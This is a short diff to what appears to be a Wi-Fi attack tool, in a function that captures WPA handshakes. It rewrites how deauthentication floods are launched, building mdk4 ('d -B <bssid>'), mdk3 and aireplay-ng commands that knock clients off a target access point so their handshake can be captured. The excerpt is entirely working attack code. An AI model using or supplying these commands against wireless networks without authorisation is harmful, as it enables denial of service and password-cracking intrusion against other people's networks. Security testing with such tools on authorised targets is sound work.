@@ -217,7 +217,14 @@ def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown", inj
 
             # 2. Broadcast Deauth via mdk4 or aireplay-ng (only if available)
             if deauth_tool:
-                if deauth_tool in ("mdk4", "mdk3"):
+                if deauth_tool == "mdk4":
+                    # mdk4 4.x: target the AP directly with -B. The old
+                    # "-b <blacklist file>" style is mdk3-era and only reacts
+                    # to observed data traffic; -B actively floods deauth at
+                    # the specified BSSID (confirmed working on mdk4 4.2).
+                    bcast_cmd = [deauth_tool, inj_iface, "d", "-B", bssid, "-c", str(channel)]
+                elif deauth_tool == "mdk3":
+                    # mdk3 has no -B; keep the blacklist-file approach.
                     bcast_cmd = [deauth_tool, inj_iface, "d", "-b", bl_file, "-c", str(channel)]
                 else:
                     bcast_cmd = ["aireplay-ng", "-0", "15", "-a", bssid,
